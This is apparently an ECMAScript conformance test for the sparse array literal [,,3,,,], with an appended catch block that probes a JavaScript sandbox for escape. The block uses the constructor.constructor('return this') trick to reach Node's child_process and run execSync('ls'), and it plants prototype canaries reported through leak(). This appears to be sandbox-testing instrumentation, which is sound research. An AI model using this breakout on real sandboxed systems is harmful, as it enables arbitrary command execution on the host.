try {
    var array = [
        ,
        ,
        3,
        ,
        ,
    ];
    if (typeof array !== 'object') {
        $ERROR('#1: var array = [,,3,,,]; typeof array === "object". Actual: ' + typeof array);
    }
    if (array instanceof Array !== true) {
        $ERROR('#2: var array = [,,3,,,]; array instanceof Array === true');
    }
    if (array.toString !== Array.prototype.toString) {
        $ERROR('#3: var array = [,,3,,,]; array.toString === Array.prototype.toString. Actual: ' + array.toString);
    }
    if (array.length !== 5) {
        $ERROR('#4: var array = [,,3,,,]; array.length === 5. Actual: ' + array.length);
    }
    if (array[0] !== undefined) {
        $ERROR('#5: var array = [,,3,,,]; array[0] === undefined. Actual: ' + array[0]);
    }
    if (array[1] !== undefined) {
        $ERROR('#6: var array = [,,3,,,]; array[1] === undefined. Actual: ' + array[1]);
    }
    if (array[2] !== 3) {
        $ERROR('#7: var array = [,,3,,,]; array[2] === 3. Actual: ' + array[2]);
    }
    if (array[3] !== undefined) {
        $ERROR('#8: var array = [,,3,,,]; array[3] === undefined. Actual: ' + array[3]);
    }
    if (array[4] !== undefined) {
        $ERROR('#9: var array = [,,3,,,]; array[4] === undefined. Actual: ' + array[4]);
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}